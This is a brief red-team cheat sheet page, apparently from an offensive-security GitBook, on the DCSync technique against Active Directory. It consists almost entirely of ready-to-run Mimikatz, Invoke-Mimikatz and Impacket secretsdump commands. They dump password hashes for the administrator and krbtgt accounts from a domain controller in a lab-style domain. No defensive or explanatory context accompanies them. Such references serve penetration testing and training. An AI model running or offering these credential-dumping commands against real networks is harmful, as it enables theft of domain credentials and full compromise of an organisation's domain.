---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/credential-access/os-credential-dumping/dcsync
---

# DCSync

```powershell
# Mimikatz
mimikatz.exe "lsadump::dcsync /domain:vulnableone.local /user:vulnableone\administrator" "exit"

# Invoke-Mimikatz (Locally)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:vulnableone\krbtgt"'

# Impacket
impacket-secretsdump -just-dc-user krbtgt vulnableone/sqlsvc@10.10.10.10
impacket-secretsdump vulnableone/admin@10.10.10.10 -ts
```
